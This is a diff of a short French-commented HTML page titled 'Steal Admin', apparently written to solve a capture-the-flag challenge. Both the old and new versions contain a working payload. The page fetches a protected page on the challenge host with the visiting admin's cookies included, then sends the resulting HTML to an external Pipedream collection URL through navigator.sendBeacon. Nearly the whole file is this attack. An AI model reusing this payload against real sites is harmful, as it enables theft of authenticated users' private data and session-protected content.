@@ -1,18 +1,29 @@
-<!DOCTYPE html><meta charset="utf-8" />
-<h1>Dump admin :</h1>
-<pre id="out">…</pre>
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Steal Admin</title>
+  </head>
+  <body>
+    <h1>Contenu volé :</h1>
+    <pre id="out">en attente…</pre>
 
-<script>
-  (async () => {
-    // 1) Fetch absolu sur le CTF → COOKIE PART !
-    const html = await fetch("https://spacefleetcommand.404ctf.fr/", {
-      credentials: "include",
-    }).then((r) => r.text());
+    <script>
+      (async () => {
+        // 1️⃣ On récupère la page protégée en « first-party », donc COOKIE inclut
+        const resp = await fetch("https://spacefleetcommand.404ctf.fr/", {
+          credentials: "include", // <— envoie bien le token
+        });
 
-    // 2) Affichage pour debug
-    out.textContent = html;
+        // 2️⃣ On lit le HTML en clair
+        const html = await resp.text();
 
-    // 3) EXFIL
-    navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", html);
-  })();
-</script>
+        // 3️⃣ On l’affiche pour debug
+        document.getElementById("out").textContent = html;
+
+        // 4️⃣ Facultatif : exfiltration vers Pipedream
+        navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", html);
+      })();
+    </script>
+  </body>
+</html>
